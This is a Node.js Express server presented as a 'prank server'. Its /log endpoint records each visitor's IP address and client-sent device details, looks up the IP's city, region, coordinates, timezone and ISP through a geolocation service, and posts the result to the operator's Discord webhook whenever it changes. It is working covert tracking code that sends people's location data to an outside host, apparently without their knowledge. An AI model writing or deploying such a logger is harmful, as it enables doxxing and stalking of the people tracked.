const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Load webhook from Render environment variables (set this in dashboard!)
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

if (!DISCORD_WEBHOOK) {
  console.error('DISCORD_WEBHOOK is missing in environment variables!');
}

const lastData = {}; // stores last seen data per user

app.post('/log', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

  const userID = req.body.userID || 'unknown';
  const deviceInfo = req.body.deviceInfo || {};

  try {
    const geoResp = await axios.get(`https://ipapi.co/${ip}/json/`);
    const geo = geoResp.data;
    if (geo.error) throw new Error(geo.reason || 'Geo fail');

    const fullInfo = {
      ip,
      city: geo.city || '???',
      region: geo.region || '???',
      country: geo.country_name || '???',
      lat: geo.latitude?.toFixed(3) || '???',
      lon: geo.longitude?.toFixed(3) || '???',
      timezone: geo.timezone || '???',
      isp: geo.org || '???',
      ...deviceInfo
    };

    // This block MUST be INSIDE the function — NOT at top of file
    const last = lastData[userID];
    if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
      if (DISCORD_WEBHOOK) {
        await axios.post(DISCORD_WEBHOOK, {
          content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
            Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
        });
      }
    }

    lastData[userID] = fullInfo;
    res.json(fullInfo);
  } catch (err) {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/', (req, res) => res.send('Prank server running!'));

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Running on port ${port}`));
